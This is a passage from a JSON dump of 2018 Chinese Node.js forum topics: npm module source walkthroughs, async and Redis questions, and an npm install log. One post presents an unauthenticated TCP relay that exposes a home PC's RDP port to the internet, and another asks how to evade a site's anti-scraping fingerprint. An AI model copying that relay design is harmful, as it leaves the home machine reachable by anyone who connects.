[]);\n};\n\nfunction flat(arr, res) {\n  var i = 0, cur;\n  var len = arr.length;\n  for (; i &lt; len; i++) {\n    cur = arr[i];\n    Array.isArray(cur) ? flat(cur, res) : res.push(cur);\n  }\n  return res;\n}\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）首先计算传入数组的长度；</p>\n<p>2）接着遍历数组。如果数组的某个元素也是数组，那么递归遍历该元素。如果某个元素不是数组类型，那么保存该元素。</p>\n<p>3）遍历结束，返回保存的数组。</p>\n</div>","title":"npm模块学习之arr-flatten","last_reply_at":"2018-12-05T03:02:18.960Z","good":false,"top":false,"reply_count":0,"visit_count":711,"create_at":"2018-12-05T03:02:18.960Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"5c061a3b1c62d833493507c0","author_id":"582180b9d5e70f900534345b","tab":"share","content":"<div class=\"markdown-text\"><p>本人利用业余时间结合翻译工具翻译了一下sharp.js的文档，欢迎访问，个人能力有限，有不足之处还望及时指正。\n中文文档地址：<a href=\"https://yunlzhang.github.io/sharp-documents-cn/\">https://yunlzhang.github.io/sharp-documents-cn/</a>\n原文档地址：<a href=\"http://sharp.pixelplumbing.com/en/stable/api-operation/\">http://sharp.pixelplumbing.com/en/stable/api-operation/</a>\n另外本人用这个库开发一个图片裁剪小程序，欢迎大家访问，功能在不断增加中，欢迎提建议及意见。小程序码如下：\n<img src=\"//static.cnodejs.org/FiS9fIWe_qaks523j0DjpGZ5Ne8i\" alt=\"WechatIMG8.jpeg\"></p>\n</div>","title":"sharp.js中文文档","last_reply_at":"2018-12-05T02:56:12.097Z","good":false,"top":false,"reply_count":7,"visit_count":826,"create_at":"2018-12-04T06:10:03.663Z","author":{"loginname":"JaqenZhang","avatar_url":"https://avatars3.githubusercontent.com/u/19965441?v=4&s=120"}},{"id":"5c07391dd3b8ab334e8dad96","author_id":"57067a058265278d59c7e61f","tab":"share","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/array-last\">https://github.com/jonschlinkert/array-last</a></p>\n<h2>2、作用</h2>\n<p>获取数组最后一个或者后几个元素</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const last = require(&#x27;array-last&#x27;);\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;])) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], 1)) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], 3)) &#x2F;&#x2F; 输出：[ &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27; ]\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], &#x27;3&#x27;)) &#x2F;&#x2F; 输出：[ &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27; ]\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], undefined)) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], null)) &#x2F;&#x2F; 输出：h\n\nconsole.log(last([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;], &#x27;&#x27;)) &#x2F;&#x2F; 输出：h\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>var isNumber = require(&#x27;is-number&#x27;);\n\nmodule.exports = function last(arr, n) {\n  if (!Array.isArray(arr)) {\n    throw new Error(&#x27;expected the first argument to be an array&#x27;);\n  }\n\n  var len = arr.length;\n  if (len === 0) {\n    return null;\n  }\n\n  n = isNumber(n) ? +n : 1;\n  if (n === 1) {\n    return arr[len - 1];\n  }\n\n  var res = new Array(n);\n  while (n--) {\n    res[n] = arr[--len];\n  }\n  return res;\n};\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）该模块一共两个参数，第一个参数是数组，第二个是或者数据的个数；</p>\n<p>2）如果第一个参数传入的不是数组，会暴露类型错误异常；</p>\n<p>3）接着获取数组的长度，如果传入的是空数组，那么就返回null；</p>\n<p>4）接着判断传入的个数n是否为数字类型。如果不是，n默认为1；</p>\n<p>5）如果n为1，那么获取数组最后一个元素，并返回；</p>\n<p>6）然后定义一个新数组res。接着在while循环中获取数组n个数据，并保存到res；</p>\n<p>7）最后返回res。</p>\n</div>","title":"npm模块学习之array-last","last_reply_at":"2018-12-05T02:34:05.861Z","good":false,"top":false,"reply_count":0,"visit_count":674,"create_at":"2018-12-05T02:34:05.861Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"5b166a1b5cd02be6409011e9","author_id":"597220fe8f0313ff0d08d6bb","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>上篇帖子有人问不知道买来阿里云可以干啥，突然发现可以通过阿里云部署远程桌面代理。\n通过node来部署，代码不超过100行，估计花生壳的原理和这类似吧。</p>\n</blockquote>\n<p>需求：</p>\n<blockquote>\n<p>在外网远程桌面到家里的个人电脑</p>\n</blockquote>\n<p>一般情况下家里的电脑是没有公网IP的，所以远程桌面往往需要借助于teamviewer或者向日葵等软件。这篇文章教你用100行代码实现远程桌面到家里的电脑。 <strong>亲测有效</strong></p>\n<p><strong>1. server.js 将该程序部署到阿里云</strong></p>\n<pre class=\"prettyprint\"><code>  const net = require(&#x27;net&#x27;);\n  \n  let target = null;\n  let client = null;\n  let server = net.createServer(function(socket){\n\t  if(!target){\n\t\t  target = socket;\n\t\t  console.log(&#x27;target ready.&#x27;);\n\t  }else{\n\t\t  client = socket;\n\t\t  console.log(&#x27;client connectd to target success.&#x27;);\n\t\t  client.on(&#x27;data&#x27;,function(data){target.write(data);});\n\t\t  target.on(&#x27;data&#x27;,function(data){client.write(data);});\n\t  }\n\t  socket.on(&#x27;error&#x27;,function(err){\n\t\t console.log(&#x27;err happen:&#x27;,err,socket);\n\t  });\n\t  socket.on(&#x27;close&#x27;,function(){console.log(&#x27;connect close.&#x27;);});\n  \n  });\n  server.listen({port:12388},function(){\n\t\t  var address=server.address();\n\t\t  console.log(&quot; opened server on address %j &quot;,address);\n  })\n</code></pre><p><strong>2. client.js 将该程序部署到你需要连接的家中的电脑</strong>  <em>39.108.22.116为你的阿里云的公网IP</em></p>\n<pre class=\"prettyprint\"><code>  const net = require(&#x27;net&#x27;);\n  let flag1 = 0, flag2 = 0;\n  let target = new net.Socket();\n  target.connect({host:&#x27;localhost&#x27;,port:3389},function(){\n\t  console.log(&#x27;connect localhot:3389 success.&#x27;);\n\t  flag1 = 1;\n  });\n  let server = new net.Socket();\n  server.connect({host:&#x27;39.108.22.116&#x27;,port:12388},function(){\n\t  console.log(&#x27;connect 39.108.22.116:12388 success.&#x27;);\n\t  flag2 = 1;\n  });\n  function conn(){\n\t  server.on(&#x27;data&#x27;,function(data){target.write(data);});\n\t  target.on(&#x27;data&#x27;,function(data){server.write(data);});\n  }\n  setTimeout(conn,10000);\n</code></pre><p><strong>3. 好了万事俱备。 在第3台电脑上打开远程桌面连接直接输入39.108.22.116:12388吧，然后输入用户名和密码就可以连接到家中的电脑了。</strong></p>\n</div>","title":"阿里云可以干啥","last_reply_at":"2018-12-05T02:23:48.969Z","good":false,"top":false,"reply_count":6,"visit_count":1341,"create_at":"2018-06-05T10:46:51.681Z","author":{"loginname":"lovegnep","avatar_url":"https://avatars0.githubusercontent.com/u/29669264?v=4&s=120"}},{"id":"5c072c3b1c62d83349350d85","author_id":"59964933bae6f2ed6f7e4af9","tab":"ask","content":"<div class=\"markdown-text\"><p>有没有egg-logger传输到Logstash的一些demo可以分享下</p>\n</div>","title":"有没有egg-logger传输到Logstash的一些demo可以分享下","last_reply_at":"2018-12-05T01:39:07.884Z","good":false,"top":false,"reply_count":0,"visit_count":638,"create_at":"2018-12-05T01:39:07.884Z","author":{"loginname":"PowerDos","avatar_url":"https://avatars0.githubusercontent.com/u/19368599?v=4&s=120"}},{"id":"5c03b36d39c0af64fddb7d9b","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"ask","content":"<div class=\"markdown-text\"><p>node 要学到什么程度才能不被喷</p>\n</div>","title":"怎么样才能只凭借着JS成为不被喷的全栈工程师","last_reply_at":"2018-12-05T00:13:11.040Z","good":false,"top":false,"reply_count":30,"visit_count":1475,"create_at":"2018-12-02T10:26:53.326Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"5bf28a10e6481c5709f5d3b9","author_id":"5b4fdf5faef62f1b0f9e0434","tab":"ask","content":"<div class=\"markdown-text\"><p>我遇到了这样一个问题,：\n\t在爬取http://www.marinetraffic.com 这个网站的过程中，发现 有反爬虫机制，尝试了代理ip等方式都失败了。\n\t最后发现是因为这个网站会对机器生成一个机器指纹，限制访问频率：如下图:\n\t<img src=\"//static.cnodejs.org/FlgQAj_nRGqHwx3FKyTtWT4MZVdB\" alt=\"image.png\">\n\t然后我就在这个网站的js文件里翻这个fingerprint的生成函数，然后我找到了这个：\n\t<img src=\"//static.cnodejs.org/Fmnr6rK5ZHcNHHuKbA-NM57EGYo7\" alt=\"image.png\">\n\t然后我在调试这个函数的时候发现，这个函数生成的Fingerprint和最后传给服务器的并不一样,传递给服务器的指纹如下图：\n\t<img src=\"//static.cnodejs.org/Fsu-UnUgHpCX3uGASwuR3e7_Wctb\" alt=\"image.png\">\n\t但是这个函数生成的只是一串数字，\n\t有没有大牛有好的方法呢？</p>\n</div>","title":"如何破译前端代码？","last_reply_at":"2018-12-04T20:02:01.985Z","good":false,"top":false,"reply_count":6,"visit_count":1472,"create_at":"2018-11-19T10:01:52.617Z","author":{"loginname":"assmdx","avatar_url":"https://avatars2.githubusercontent.com/u/19722693?v=4&s=120"}},{"id":"5c0690551c62d83349350bf2","author_id":"57067a058265278d59c7e61f","tab":"share","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/dcousens/is-sorted\">https://github.com/dcousens/is-sorted</a></p>\n<h2>2、作用</h2>\n<p>判断一个数组是否已经排序</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const sorted = require(&#x27;is-sorted&#x27;);\nconsole.log(sorted([7, 8, 11]))        &#x2F;&#x2F; 输出：true\nconsole.log(sorted([66, 55, 1]))       &#x2F;&#x2F; 输出：false\nconsole.log(sorted([45, 2, 55], function (a, b) {return b - a}))    &#x2F;&#x2F; 输出：false\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>function defaultComparator (a, b) {\n return a - b\n} \nmodule.exports = function checksort (array, comparator) {\n if (!Array.isArray(array)) throw new TypeError(&#x27;Expected Array, got &#x27; + (typeof array))\n comparator = comparator || defaultComparator\n for (var i = 1, length = array.length; i &lt; length; ++i) {\n   if (comparator(array[i - 1], array[i]) &gt; 0) return false\n }\n return true\n}\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）is-sorted暴露出的函数有两个参数，第一个参数必须是数组，第二个是函数。如果第一个不是数组，那么就会报类型错误的异常；</p>\n<p>2）如果外界调用函数的时候传入comparator，那么就那comparator的规则比较数组的前后两个元素，否则就按照默认的defaultComparator来比较。</p>\n<p>3）接着遍历传入的数组：\n如果没有传入comparator，那么就使用默认的defaultComparator来比较，也就是如果前面的元素比后面的元素大，就返回false。等到遍历结束，如果没有找到前面比后面大的元素，那么就返回true。\n如果传入了comparator，那么就按照comparator比较前后的元素，只要函数comparator返回的结果大于0，那么就返回false。否则就返回true。</p>\n</div>","title":"npm模块学习之is-sorted","last_reply_at":"2018-12-04T14:33:57.135Z","good":false,"top":false,"reply_count":0,"visit_count":493,"create_at":"2018-12-04T14:33:57.135Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"57fda8290bab808265185cd0","author_id":"57fda6600bab808265185ccd","tab":"ask","content":"<div class=\"markdown-text\"><p>在高并发压力测试下ioredis访问redis集群在同一秒中有多个超时80毫秒以上的，请问专家门知道是什么问题吗？\n并发测试数据有：\n50并发，大于80毫秒的超时数有72次。\n100并发，大于80毫秒的超时数有202次。</p>\n<p>硬件配置：4核16G ，2台虚拟机</p>\n</div>","title":"ioredis访问redis集群超时","last_reply_at":"2018-12-04T14:06:57.279Z","good":false,"top":false,"reply_count":12,"visit_count":2188,"create_at":"2016-10-12T03:04:09.715Z","author":{"loginname":"zhaozhi1989","avatar_url":"https://avatars.githubusercontent.com/u/22743006?v=3&s=120"}},{"id":"5c063fcd1c62d833493509c1","author_id":"5844b2159ff0dbf333450781","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，\n日志通过队列给nodejs消费，目前流量比较小，但是如果select，然后+1 update 可能因为异步导致数据不准确\n有什么比较简单的办法解决嘛，改成阻塞？ 记在内存，再定时更新？</p>\n</div>","title":"实时分析log日志流量统计并存入数据库时，如何避免异步导致的计数错误","last_reply_at":"2018-12-04T09:57:21.983Z","good":false,"top":false,"reply_count":1,"visit_count":491,"create_at":"2018-12-04T08:50:21.023Z","author":{"loginname":"lushanyanYX","avatar_url":"https://avatars3.githubusercontent.com/u/20239341?v=4&s=120"}},{"id":"5c04eeba39c0af64fddb8379","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>process.nextTick(function() {\n  console.log(&#x27;nextTick延迟执行1&#x27;);\n});\nprocess.nextTick(function() {\n  console.log(&#x27;nextTick延迟执行2&#x27;);\n});\n\nsetImmediate(function() {\n  console.log(&#x27;setImmediate延迟执行1&#x27;);\n\n  &#x2F;&#x2F;进入下次循环\n  process.nextTick(function() {\n    console.log(&#x27;强势插入&#x27;);\n  });\n});\n\nsetImmediate(function() {\n  console.log(&#x27;setImmediate延迟执行2&#x27;);\n});\n\nconsole.log(&#x27;正常执行&#x27;);\n</code></pre><p>就是自己运行了这段代码，发现跟书上运行的结果不一样。\n书上的结果：</p>\n<blockquote>\n<p>正常执行\nnextTick延迟执行1\nnextTick延迟执行2\nsetImmediate延迟执行1\n强势插入\nsetImmediate延迟执行2</p>\n</blockquote>\n<p>我运行的结果：</p>\n<blockquote>\n<p>正常执行\nnextTick延迟执行1\nnextTick延迟执行2\nsetImmediate延迟执行1\nsetImmediate延迟执行2\n强势插入</p>\n</blockquote>\n</div>","title":"关于深入浅出node.js一书中process.nextTick()和setImmediate()的问题","last_reply_at":"2018-12-04T09:53:55.165Z","good":false,"top":false,"reply_count":4,"visit_count":593,"create_at":"2018-12-03T08:52:10.560Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5c062dedd3b8ab334e8da844","author_id":"4efc278725fa69ac690006a1","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>const { exec } = require(&#x27;child_process&#x27;);\n    &#x2F;&#x2F; 打注册表\n    exec(&#x27;REG ADD HKEY_CLASSES_ROOT\\\\.VBS &#x2F;t REG_SZ &#x2F;d VBSFile&#x27;, function (err, stdout, stderr) {\n        &#x2F;&#x2F; console.log(err);\n        exec(&#x27;REG ADD HKEY_CLASSES_ROOT\\\\.VBS\\\\PersistentHandler &#x2F;t REG_SZ &#x2F;d {5e941d80-bf96-11cd-b579-08002b30bfeb}&#x27;, function (err, stdout, stderr) {\n            &#x2F;&#x2F; console.log(err);\n        });\n    });\n</code></pre><pre class=\"prettyprint\"><code>这样运行会出现很多reg.exe，占用cpu 100%，如何结束这些进程？</code></pre></div>","title":"child_process里的exec如果结束reg.exe进程","last_reply_at":"2018-12-04T08:11:39.788Z","good":false,"top":false,"reply_count":1,"visit_count":483,"create_at":"2018-12-04T07:34:05.957Z","author":{"loginname":"qianzhangsheng","avatar_url":"https://avatars2.githubusercontent.com/u/1262247?v=4&s=120"}},{"id":"5c061d75d3b8ab334e8da762","author_id":"5bfd65d4be1b120abac5d838","tab":"ask","content":"<div class=\"markdown-text\"><p>我百度以下方法，都不行。\n<a href=\"http://www.cnblogs.com/haochuang/p/5688093.html\">http://www.cnblogs.com/haochuang/p/5688093.html</a>\n<a href=\"https://www.jianshu.com/p/24ccd5f3f582\">https://www.jianshu.com/p/24ccd5f3f582</a>\n<a href=\"https://youcanping.cn/2017/12/17/node-gyp-error/\">https://youcanping.cn/2017/12/17/node-gyp-error/</a></p>\n<p>环境：\nusing npm@6.4.1\nusing node@v10.14.1\nWindows 7 64位</p>\n<p>cmd 截图如下\n<img src=\"//static.cnodejs.org/FiOrIG4FS75nWnpcf2KPDbn6B72C\" alt=\"image.png\"></p>\n<p>install.log</p>\n<pre class=\"prettyprint\"><code>0 info it worked if it ends with ok\n1 verbose cli [ &#x27;C:\\\\Program Files\\\\nodejs\\\\node.exe&#x27;,\n1 verbose cli   &#x27;C:\\\\Users\\\\Client\\\\AppData\\\\Roaming\\\\npm\\\\node_modules\\\\npm\\\\bin\\\\npm-cli.js&#x27;,\n1 verbose cli   &#x27;install&#x27;,\n1 verbose cli   &#x27;easy-monitor&#x27; ]\n2 info using npm@6.4.1\n3 info using node@v10.14.1\n4 verbose config Skipping project config: C:\\Users\\Client&#x2F;.npmrc. (matches userconfig)\n5 verbose npm-session 032a3c918d8903b0\n6 silly install loadCurrentTree\n7 silly install readLocalPackageData\n8 http fetch GET 304 https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;easy-monitor 186ms (from cache)\n9 silly pacote tag manifest for easy-monitor@latest fetched in 217ms\n10 timing stage:loadCurrentTree Completed in 832ms\n11 silly install loadIdealTree\n12 silly install cloneCurrentTreeToIdealTree\n13 timing stage:loadIdealTree:cloneCurrentTree Completed in 2ms\n14 silly install loadShrinkwrap\n15 timing stage:loadIdealTree:loadShrinkwrap Completed in 142ms\n16 silly install loadAllDepsIntoIdealTree\n17 silly resolveWithNewModule easy-monitor@2.2.6-rc.0 checking installable status\n18 http fetch GET 304 https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;v8-profiler-node8 65ms (from cache)\n19 silly pacote range manifest for v8-profiler-node8@^6.0.1 fetched in 69ms\n20 silly resolveWithNewModule v8-profiler-node8@6.0.1 checking installable status\n21 http fetch GET 304 https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;nan 50ms (from cache)\n22 silly pacote range manifest for nan@^2.5.1 fetched in 52ms\n23 silly resolveWithNewModule nan@2.11.1 checking installable status\n24 http fetch GET 304 https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;node-pre-gyp 74ms (from cache)\n25 silly pacote range manifest for node-pre-gyp@^0.11.0 fetched in 76ms\n26 silly resolveWithNewModule node-pre-gyp@0.11.0 checking installable status\n27 timing stage:loadIdealTree:loadAllDepsIntoIdealTree Completed in 302ms\n28 timing stage:loadIdealTree Completed in 506ms\n29 silly currentTree Client\n29 silly currentTree +-- abbrev@1.1.1\n29 silly currentTree +-- accepts@1.3.5\n29 silly currentTree +-- ansi-regex@2.1.1\n29 silly currentTree +-- aproba@1.2.0\n29 silly currentTree +-- are-we-there-yet@1.1.5\n29 silly currentTree +-- array-flatten@1.1.1\n29 silly currentTree +-- balanced-match@1.0.0\n29 silly currentTree +-- basic-auth@1.1.0\n29 silly currentTree +-- body-parser@1.18.3\n29 silly currentTree | +-- http-errors@1.6.3\n29 silly currentTree | +-- iconv-lite@0.4.23\n29 silly currentTree | &#96;-- qs@6.5.2\n29 silly currentTree +-- brace-expansion@1.1.11\n29 silly currentTree +-- bytes@3.0.0\n29 silly currentTree +-- chownr@1.1.1\n29 silly currentTree +-- co@4.6.0\n29 silly currentTree +-- code-point-at@1.1.0\n29 silly currentTree +-- colors@1.3.2\n29 silly currentTree +-- compressible@2.0.15\n29 silly currentTree +-- compression@1.7.3\n29 silly currentTree +-- concat-map@0.0.1\n29 silly currentTree +-- console-control-strings@1.1.0\n29 silly currentTree +-- content-disposition@0.5.2\n29 silly currentTree +-- content-type@1.0.4\n29 silly currentTree +-- cookie-signature@1.1.0\n29 silly currentTree +-- cookie@0.3.1\n29 silly currentTree +-- core-util-is@1.0.2\n29 silly currentTree +-- debug@2.6.9\n29 silly currentTree +-- deep-extend@0.6.0\n29 silly currentTree +-- delegates@1.0.0\n29 silly currentTree +-- depd@1.1.2\n29 silly currentTree +-- destroy@1.0.4\n29 silly currentTree +-- detect-libc@1.0.3\n29 silly currentTree +-- ee-first@1.1.1\n29 silly currentTree +-- ejs@2.6.1\n29 silly currentTree +-- encodeurl@1.0.2\n29 silly currentTree +-- escape-html@1.0.3\n29 silly currentTree +-- etag@1.8.1\n29 silly currentTree +-- express@4.16.4\n29 silly currentTree | +-- cookie-signature@1.0.6\n29 silly currentTree | +-- qs@6.5.2\n29 silly currentTree | &#96;-- statuses@1.4.0\n29 silly currentTree +-- finalhandler@1.1.1\n29 silly currentTree | &#96;-- statuses@1.4.0\n29 silly currentTree +-- forwarded@0.1.2\n29 silly currentTree +-- fresh@0.5.2\n29 silly currentTree +-- fs-minipass@1.2.5\n29 silly currentTree +-- fs.realpath@1.0.0\n29 silly currentTree +-- gauge@2.7.4\n29 silly currentTree +-- glob@7.1.3\n29 silly currentTree +-- has-unicode@2.0.1\n29 silly currentTree +-- http-errors@1.7.1\n29 silly currentTree +-- iconv-lite@0.4.24\n29 silly currentTree +-- ignore-walk@3.0.1\n29 silly currentTree +-- inflight@1.0.6\n29 silly currentTree +-- inherits@2.0.3\n29 silly currentTree +-- ini@1.3.5\n29 silly currentTree +-- ipaddr.js@1.8.1\n29 silly currentTree +-- is-fullwidth-code-point@1.0.0\n29 silly currentTree +-- isarray@1.0.0\n29 silly currentTree +-- jsonparse@1.3.1\n29 silly currentTree +-- JSONStream@1.3.5\n29 silly currentTree +-- lodash@4.17.11\n29 silly currentTree +-- media-typer@0.3.0\n29 silly currentTree +-- merge-descriptors@1.0.1\n29 silly currentTree +-- methods@1.1.2\n29 silly currentTree +-- mime-db@1.37.0\n29 silly currentTree +-- mime-types@2.1.21\n29 silly currentTree +-- mime@1.6.0\n29 silly currentTree +-- minimatch@3.0.4\n29 silly currentTree +-- minimist@0.0.8\n29 silly currentTree +-- minipass@2.3.5\n29 silly currentTree +-- minizlib@1.1.1\n29 silly currentTree +-- mkdirp@0.5.1\n29 silly currentTree +-- ms@2.0.0\n29 silly currentTree +-- needle@2.2.4\n29 silly currentTree +-- negotiator@0.6.1\n29 silly currentTree +-- node-pre-gyp@0.12.0\n29 silly currentTree +-- nopt@4.0.1\n29 silly currentTree +-- npm-bundled@1.0.5\n29 silly currentTree +-- npm-packlist@1.1.12\n29 silly currentTree +-- npmlog@4.1.2\n29 silly currentTree +-- number-is-nan@1.0.1\n29 silly currentTree +-- object-assign@4.1.1\n29 silly currentTree +-- on-finished@2.3.0\n29 silly currentTree +-- on-headers@1.0.1\n29 silly currentTree +-- once@1.4.0\n29 silly currentTree +-- os-homedir@1.0.2\n29 silly currentTree +-- os-tmpdir@1.0.2\n29 silly currentTree +-- osenv@0.1.5\n29 silly currentTree +-- parseurl@1.3.2\n29 silly currentTree +-- path-is-absolute@1.0.1\n29 silly currentTree +-- path-to-regexp@0.1.7\n29 silly currentTree +-- pretty-bytes@4.0.2\n29 silly currentTree +-- process-nextick-args@2.0.0\n29 silly currentTree +-- proxy-addr@2.0.4\n29 silly currentTree | &#96;-- ipaddr.js@1.8.0\n29 silly currentTree +-- qs@6.6.0\n29 silly currentTree +-- range-parser@1.2.0\n29 silly currentTree +-- raw-body@2.3.3\n29 silly currentTree | +-- http-errors@1.6.3\n29 silly currentTree | &#96;-- iconv-lite@0.4.23\n29 silly currentTree +-- rc@1.2.8\n29 silly currentTree | &#96;-- minimist@1.2.0\n29 silly currentTree +-- readable-stream@2.3.6\n29 silly currentTree +-- rimraf@2.6.2\n29 silly currentTree +-- safe-buffer@5.1.2\n29 silly currentTree +-- safer-buffer@2.1.2\n29 silly currentTree +-- sax@1.2.4\n29 silly currentTree +-- semver@5.6.0\n29 silly currentTree +-- send@0.16.2\n29 silly currentTree | +-- http-errors@1.6.3\n29 silly currentTree | +-- mime@1.4.1\n29 silly currentTree | &#96;-- statuses@1.4.0\n29 silly currentTree +-- serve-favicon@2.5.0\n29 silly currentTree | +-- ms@2.1.1\n29 silly currentTree | &#96;-- safe-buffer@5.1.1\n29 silly currentTree +-- serve-static@1.13.2\n29 silly currentTree +-- set-blocking@2.0.0\n29 silly currentTree +-- setprototypeof@1.1.0\n29 silly currentTree +-- signal-exit@3.0.2\n29 silly currentTree +-- statuses@1.5.0\n29 silly currentTree +-- string_decoder@1.1.1\n29 silly currentTree +-- string-width@1.0.2\n29 silly currentTree +-- strip-ansi@3.0.1\n29 silly currentTree +-- strip-json-comments@2.0.1\n29 silly currentTree +-- tar@4.4.8\n29 silly currentTree +-- through@2.3.8\n29 silly currentTree +-- toidentifier@1.0.0\n29 silly currentTree +-- type-is@1.6.16\n29 silly currentTree +-- unpipe@1.0.0\n29 silly currentTree +-- util-deprecate@1.0.2\n29 silly currentTree +-- utils-merge@1.0.1\n29 silly currentTree +-- vary@1.1.2\n29 silly currentTree +-- wide-align@1.1.3\n29 silly currentTree +-- wrappy@1.0.2\n29 silly currentTree &#96;-- yallist@3.0.3\n30 silly idealTree Client\n30 silly idealTree +-- abbrev@1.1.1\n30 silly idealTree +-- accepts@1.3.5\n30 silly idealTree +-- ansi-regex@2.1.1\n30 silly idealTree +-- aproba@1.2.0\n30 silly idealTree +-- are-we-there-yet@1.1.5\n30 silly idealTree +-- array-flatten@1.1.1\n30 silly idealTree +-- balanced-match@1.0.0\n30 silly idealTree +-- basic-auth@1.1.0\n30 silly idealTree +-- body-parser@1.18.3\n30 silly idealTree | +-- http-errors@1.6.3\n30 silly idealTree | +-- iconv-lite@0.4.23\n30 silly idealTree | &#96;-- qs@6.5.2\n30 silly idealTree +-- brace-expansion@1.1.11\n30 silly idealTree +-- bytes@3.0.0\n30 silly idealTree +-- chownr@1.1.1\n30 silly idealTree +-- co@4.6.0\n30 silly idealTree +-- code-point-at@1.1.0\n30 silly idealTree +-- colors@1.3.2\n30 silly idealTree +-- compressible@2.0.15\n30 silly idealTree +-- compression@1.7.3\n30 silly idealTree +-- concat-map@0.0.1\n30 silly idealTree +-- console-control-strings@1.1.0\n30 silly idealTree +-- content-disposition@0.5.2\n30 silly idealTree +-- content-type@1.0.4\n30 silly idealTree +-- cookie-signature@1.1.0\n30 silly idealTree +-- cookie@0.3.1\n30 silly idealTree +-- core-util-is@1.0.2\n30 silly idealTree +-- debug@2.6.9\n30 silly idealTree +-- deep-extend@0.6.0\n30 silly idealTree +-- delegates@1.0.0\n30 silly idealTree +-- depd@1.1.2\n30 silly idealTree +-- destroy@1.0.4\n30 silly idealTree +-- detect-libc@1.0.3\n30 silly idealTree +-- easy-monitor@2.2.6-rc.0\n30 silly idealTree +-- ee-first@1.1.1\n30 silly idealTree +-- ejs@2.6.1\n30 silly idealTree +-- encodeurl@1.0.2\n30 silly idealTree +-- escape-html@1.0.3\n30 silly idealTree +-- etag@1.8.1\n30 silly idealTree +-- express@4.16.4\n30 silly idealTree | +-- cookie-signature@1.0.6\n30 silly idealTree | +-- qs@6.5.2\n30 silly idealTree | &#96;-- statuses@1.4.0\n30 silly idealTree +-- finalhandler@1.1.1\n30 silly idealTree | &#96;-- statuses@1.4.0\n30 silly idealTree +-- forwarded@0.1.2\n30 silly idealTree +-- fresh@0.5.2\n30 silly idealTree +-- fs-minipass@1.2.5\n30 silly idealTree +-- fs.realpath@1.0.0\n30 silly idealTree +-- gauge@2.7.4\n30 silly idealTree +-- glob@7.1.3\n30 silly idealTree +-- has-unicode@2.0.1\n30 silly idealTree +-- http-errors@1.7.1\n30 silly idealTree +-- iconv-lite@0.4.24\n30 silly idealTree +-- ignore-walk@3.0.1\n30 silly idealTree +-- inflight@1.0.6\n30 silly idealTree +-- inherits@2.0.3\n30 silly idealTree +-- ini@1.3.5\n30 silly idealTree +-- ipaddr.js@1.8.1\n30 silly idealTree +-- is-fullwidth-code-point@1.0.0\n30 silly idealTree +-- isarray@1.0.0\n30 silly idealTree +-- jsonparse@1.3.1\n30 silly idealTree +-- JSONStream@1.3.5\n30 silly idealTree +-- lodash@4.17.11\n30 silly idealTree +-- media-typer@0.3.0\n30 silly idealTree +-- merge-descriptors@1.0.1\n30 silly idealTree +-- methods@1.1.2\n30 silly idealTree +-- mime-db@1.37.0\n30 silly idealTree +-- mime-types@2.1.21\n30 silly idealTree +-- mime@1.6.0\n30 silly idealTree +-- minimatch@3.0.4\n30 silly idealTree +-- minimist@0.0.8\n30 silly idealTree +-- minipass@2.3.5\n30 silly idealTree +-- minizlib@1.1.1\n30 silly 